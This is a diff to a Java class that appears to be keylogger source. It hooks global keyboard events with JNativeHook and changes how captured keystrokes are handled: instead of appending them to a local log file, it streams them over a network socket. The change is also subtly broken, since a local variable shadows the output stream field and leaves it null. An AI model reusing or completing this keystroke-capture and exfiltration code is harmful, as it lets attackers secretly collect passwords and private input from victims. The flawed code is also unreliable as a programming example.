@@ -38,7 +38,7 @@ import java.awt.event.*;
 import java.io.*;
 import java.net.Socket;
 
-public class KeyStroke extends JFrame implements NativeKeyListener{
+public class KeyStroke extends JFrame implements NativeKeyListener, Runnable{
     private JFrame frame;
     private String s="";
     private boolean b_hook, b_unhook,b_shift, b_capslock;
@@ -46,9 +46,10 @@ public class KeyStroke extends JFrame implements NativeKeyListener{
     private DataInputStream dataInputStream;
 	private ObjectInputStream objectInputStream;
     private DataOutputStream dataOutputStream;
-    private Socket socket;
-    public KeyStroke()
+    Socket socket;
+    public KeyStroke(Socket newSocket)
     {
+        this.socket = newSocket;
         Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
         logger.setLevel(Level.OFF);
         try {
@@ -60,13 +61,17 @@ public class KeyStroke extends JFrame implements NativeKeyListener{
         }
         init();
         GlobalScreen.addNativeKeyListener(this);
-
+        try {
+            DataOutputStream dataOutputStream = new DataOutputStream(this.socket.getOutputStream());
+        } catch (IOException e) {
+            // TODO Auto-generated catch block
+            e.printStackTrace();
+        }
         b_hook=false;
         b_unhook=false;
         b_shift=false;
         b_capslock=false;
     }
-
     public boolean getHook()
     {
         return b_hook;
@@ -99,30 +104,16 @@ public class KeyStroke extends JFrame implements NativeKeyListener{
     }
     
     public void print() throws IOException {
-        DataOutputStream cout = new DataOutputStream(socket.getOutputStream());
-        cout.writeUTF(s);
-        //System.out.println(s);
-        cout.flush();
+        dataOutputStream.writeUTF(s);
+        System.out.println(s);
+        dataOutputStream.flush();
         s="";
     }
 
     public void nativeKeyPressed(NativeKeyEvent e) {}
-    private void write(String i) {
-        BufferedWriter bufferedWriter = null;
-        Date date = Calendar.getInstance().getTime();
-        try {
-            bufferedWriter = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(path
-             + "\\log2.txt", true), "BIG5"));
-            bufferedWriter.write(date.toString() + ":" + i + "\r\n");
-            close(bufferedWriter);
-        } catch (IOException e) {
-            e.printStackTrace();
-        } finally {
-            close(bufferedWriter);
-        }
-
-    }
+   
     public void nativeKeyReleased(NativeKeyEvent e) {
+        System.out.println("in native key released");
         if (b_hook == true && b_unhook == false) {
             //System.out.println(" Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
             String pressed = NativeKeyEvent.getKeyText(e.getKeyCode());
@@ -228,4 +219,9 @@ public class KeyStroke extends JFrame implements NativeKeyListener{
             e.printStackTrace();
         }
     }
-}
+    @Override
+    public void run() {
+
+    }
+
+} 
